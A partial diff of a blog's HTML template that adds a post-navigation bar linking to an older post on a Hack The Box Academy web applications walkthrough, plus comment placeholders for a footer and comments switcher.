+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/Introduction_to_Web_Applications/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>Introduction to Web Applications — Arabic HackThe Box ACADEMY Walkthrough</p>
+    </a>
+  
+
+  
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
+  
+</nav>
+
             
 
             <!-- The Footer -->
@@ -2076,6 +2400,11 @@
     
 
     <!-- Embedded scripts -->
+
+    
+      
+      <!-- The comments switcher -->
+
 
     
 
